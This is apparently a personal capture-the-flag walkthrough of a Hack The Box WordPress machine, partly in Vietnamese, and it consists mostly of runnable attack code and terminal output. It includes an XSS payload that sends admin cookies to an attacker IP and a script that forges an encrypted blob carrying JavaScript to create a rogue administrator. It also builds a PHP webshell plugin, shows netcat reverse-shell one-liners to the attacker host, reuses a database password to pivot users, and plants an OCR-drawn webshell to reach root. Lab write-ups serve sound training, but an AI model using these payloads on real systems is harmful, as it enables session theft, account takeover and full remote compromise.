
### Initial access
Nmap scan is only https
We have wav file in uploads path on website
https://audiototext.com
Using it to change audio to text. 
`jake:ClearLightNiceSmooth4923`


```
SPK_1

0:07

Jake.

SPK_1

0:08

Clear light.

SPK_1

0:09

Nice, smooth, four, nine, two, three.
```

But this is rabbit hole jake dont have priv to create rce.

```
curl -sk -b cookies.txt "https://makesense.htb/wp-admin/admin-ajax.php" \
  -F "action=save_voice_raw" \
  -F "nonce=<FRESH_NONCE>" \
  -F "voice_recording=@/mnt/user-data/uploads/voice-message.wav;type=audio/wav" \
  -i
```
I using write up of https://rabindrameher.in/ctf/makesense-htb
```python
import base64
import hashlib
import json
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

ENCRYPTION_KEY = b"bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"


def encrypt_payload(transcription, summary):
    key = hashlib.sha256(ENCRYPTION_KEY).digest()
    aesgcm = AESGCM(key)
    iv = os.urandom(12)
    payload = json.dumps(
        {"transcription": transcription, "summary": summary}
    ).encode()
    ct = aesgcm.encrypt(iv, payload, None)
    combined = iv + ct
    return base64.b64encode(combined).decode()


# Thay <IP_KALI> bằng IP VPN của bạn (ví dụ: 10.10.14.x)
ip_kali = "10.10.16.212"

# Payload XSS kiểm tra kết nối bí mật từ Admin về máy bạn
xss_payload = (
    f"<script>fetch('http://{ip_kali}:8000/?c=' + document.cookie)</script>"
)

# Tiến hành mã hóa
blob = encrypt_payload(xss_payload, "Audio Summary")
print("--- CHUỖI AES-GCM BLOB CỦA BẠN ---")
print(blob)

```


```bash
┌──(kali㉿kali)-[~/HTB/MakeSense/wp2shell-scanner]
└─$ curl -sk https://makesense.htb/ | grep -o '"nonce":"[a-f0-9]*"'
"nonce":"215ac40a3b"
┌──(kali㉿kali)-[~/HTB/MakeSense/wp2shell-scanner]
└─$ python                                    
Python 3.14.6 (main, Jun 10 2026, 18:54:31) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import struct
... with open('dummy.wav','wb') as f:
...     f.write(b'RIFF'+struct.pack('<I',36)+b'WAVEfmt '+struct.pack('<IHHIIHH',16,1,1,8000,16000,2,16)\
+b'data'+struct.pack('<I',0))
...     
44
>>> exit
                                                                                                        
┌──(kali㉿kali)-[~/HTB/MakeSense/wp2shell-scanner]
└─$ ;s
s: command not found
                                                                                                        
┌──(kali㉿kali)-[~/HTB/MakeSense/wp2shell-scanner]
└─$ ls
dummy.wav   main.js       README.md  whisper-wrapper.js      wp2shell.py
index.html  makesense.py  struct     wp2shell-exposure.yaml
                                                                        
                                                                        
  ┌──(kali㉿kali)-[~/HTB/MakeSense]
└─$ python encryptpayload.py
--- CHUỖI AES-GCM BLOB CỦA BẠN ---
EKcDnn3Vd1C4io7Z5nvXT7XuilLzyICT5KoL87yWs6Qt0yRXWuwSg2VblhENVbdIJ6Io2RUNhbwR+GAnHeOZW8w2yGC1MkJKbrlwhk+mzEQGRdDQcULWrUR/jn9m/+r5tZxBTLyknRy5EGrt2nphr8IVwLnhobkeKTeedsPOBSbSuQzjpuqc5LfFHquECTsLuFjiItA=
                                                                                                                                                                       ┌──(kali㉿kali)-[~/HTB/MakeSense/wp2shell-scanner]
└─$ curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -F "action=save_voice_raw" \                                  
  -F "nonce=215ac40a3b" \         
  -F "voice_recording=@dummy.wav;type=audio/wav"
{"success":true,"data":{"message":"Audio saved, processing started.","post_id":83}}                                                                                                      
┌──(kali㉿kali)-[~/HTB/MakeSense]
└─$ curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -F "action=save_voice_results" \
  -F "nonce=215ac40a3b" \
  -F "post_id=83" \
  -F "encrypted_payload=EKcDnn3Vd1C4io7Z5nvXT7XuilLzyICT5KoL87yWs6Qt0yRXWuwSg2VblhENVbdIJ6Io2RUNhbwR+GAnHeOZW8w2yGC1MkJKbrlwhk+mzEQGRdDQcULWrUR/jn9m/+r5tZxBTLyknRy5EGrt2nphr8IVwLnhobkeKTeedsPOBSbSuQzjpuqc5LfFHquECTsLuFjiItA=
"
{"success":true,"data":{"message":"Results saved successfully!","post_id":83}}                                                                                                        
┌──(kali㉿kali)-[~/HTB/MakeSense]
└─$ nc -lvnp 8000                   

listening on [any] 8000 ...
connect to [10.10.16.212] from (UNKNOWN) [10.129.246.24] 38154
GET /?c=wp-settings-time-3=1788351567 HTTP/1.1
Host: 10.10.16.212:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/148.0.0.0 Safari/537.36
Accept: */*
Origin: https://makesense.htb
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9



```
After that we create user
```python
import base64
import hashlib
import json
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

ENCRYPTION_KEY = b"bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"


def encrypt_payload(transcription, summary):
    key = hashlib.sha256(ENCRYPTION_KEY).digest()
    aesgcm = AESGCM(key)
    iv = os.urandom(12)
    payload = json.dumps(
        {"transcription": transcription, "summary": summary}
    ).encode()
    ct = aesgcm.encrypt(iv, payload, None)
    combined = iv + ct
    return base64.b64encode(combined).decode()


# ĐOẠN JAVASCRIPT PAYLOAD CỦA BẠN (ĐÃ ĐỔI IP KALI CỦA BẠN)
js_payload = """<script>
fetch('/wp-admin/user-new.php').then(r=>r.text()).then(t=>{
  const nonce = t.match(/name="_wpnonce_create-user" value="([a-f0-9]+)"/)[1];
  const referer = t.match(/name="_wp_http_referer" value="([^"]+)"/)[1];
  const body = new URLSearchParams();
  body.append('action','createuser');
  body.append('_wpnonce_create-user', nonce);
  body.append('_wp_http_referer', referer);
  body.append('user_login','anh');
  body.append('email','anh@evil.com');
  body.append('pass1','P4ssw0rd!2026');
  body.append('pass2','P4ssw0rd!2026');
  body.append('role','administrator');
  return fetch('/wp-admin/user-new.php', {method:'POST', body});
}).then(()=>fetch('http://10.10.16.212:8000/pwned?ok=1'))
  .catch(e=>fetch('http://10.10.16.212:8000/pwned?err='+encodeURIComponent(e.message)));
</script>"""

# Chạy để lấy chuỗi mã hóa
blob = encrypt_payload(js_payload, "Summary Test")
print("Chuỗi forged AES-GCM blob của bạn:")
print(blob)

```
Get in admin page after create cred and install our plugin exploit

```bash
┌──(kali㉿kali)-[~/HTB/MakeSense]
└─$ # 1. Tạo thư mục tạm
mkdir -p pwn-plugin

# 2. Ghi mã độc PHP thực thi lệnh vào file
cat << 'EOF' > pwn-plugin/shell.php
<?php
/**
 * Plugin Name: Reverse Shell Plugin
 * Version: 1.0
 * Author: Pentester
 */
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
    exit;
}
?>
EOF

# 3. Nén thư mục pwn-plugin thành file zip hợp lệ
zip -r pwn-plugin.zip pwn-plugin/

  adding: pwn-plugin/ (stored 0%)
  adding: pwn-plugin/shell.php (deflated 18%)
                                           

```
We get rev shell
```bash
┌──(kali㉿kali)-[~/HTB/MakeSense]
└─$ curl -sk "https://makesense.htb/" --get --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.212 443 >/tmp/f"



┌──(kali㉿kali)-[~/HTB/MakeSense]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.212] from (UNKNOWN) [10.129.246.24] 34694
bash: cannot set terminal process group (1447): Inappropriate ioctl for device
bash: no job control in this shell
www-data@makesense:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<tml$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@makesense:/var/www/html$ export TERM=xterm-256color
export TERM=xterm-256color
www-data@makesense:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@makesense:/var/www/html$ 




```
### Lateral Movement
We read wp-config and access mysql to move to walter user
```
cat /var/www/html/wp-config.php
<?php
// SQLite database configuration
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );

// Dummy MySQL settings (required but not used with SQLite)
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );

www-data@makesense:/$ su walter
su walter
Password: JbhHDAEgXvri3!
walter@makesense:/$ 
walter@makesense:~$ cat user.txt              cat user.txt
cat user.txt
bcbe89015e03455372ba33f171227c4b
```
We find  ssh tunneling to listen to local port
### Priv escalation
Check what  is running on local port 8001
```
walter@makesense:/home$ ps aux | grep -i "8001"
root        1392  0.0  0.7 228764 31668 ?        S    07:51   0:01 php -S 127.0.0.1:8001 -t /root/ocr4/
walter    147519  0.0  0.0   6544  2348 pts/2    S+   13:49   0:00 grep --color=auto -i 8001

```

Access local webseite with walter cred
Using java script to draw php shell script to web shell
```javascript
// Đổi tên biến thành myCanvas để tránh trùng lặp hệ thống
const myCanvas = document.querySelector('canvas');
if (myCanvas) {
    const ctx = myCanvas.getContext('2d');
    // Xóa bảng vẽ cũ cho sạch nền trắng
    ctx.fillStyle = "#FFFFFF";
    ctx.fillRect(0, 0, myCanvas.width, myCanvas.height);
    
    // Cấu hình phông chữ đen, rõ nét, kích thước vừa phải để OCR đọc chuẩn
    ctx.font = "bold 24px Arial";
    ctx.fillStyle = "#000000";
    
    // Vẽ chính xác đoạn mã độc PHP lên bảng vẽ
    ctx.fillText("<?php system($_GET['cmd']); ?>", 20, 50);
    console.log("[+] Đã ép canvas vẽ mã độc PHP hoàn hảo!");
} else {
    console.log("[-] Không tìm thấy thẻ canvas trên trang này.");
}

```
![[Assets/Pasted image 20260902204818.png]]


![[Assets/Pasted image 20260902204835.png]]![[Assets/Pasted image 20260902204843.png]]
We got root process and root flag
```
┌──(kali㉿kali)-[~/HTB/MakeSense]
└─$ curl http://127.0.0.1:8001/saved/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.16.212%20443%20%3E%2Ftmp%2Ff
┌──(kali㉿kali)-[~/HTB/MakeSense]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.212] from (UNKNOWN) [10.129.246.24] 40328
bash: cannot set terminal process group (1378): Inappropriate ioctl for device
bash: no job control in this shell
root@makesense:~/ocr4/saved# id
id
uid=0(root) gid=0(root) groups=0(root)
root@makesense:~/ocr4/saved# 

root@makesense:~# cat root.txt
cat root.txt
48278c13f43f44409ed5e064d57c9aac
root@makesense:~# 




```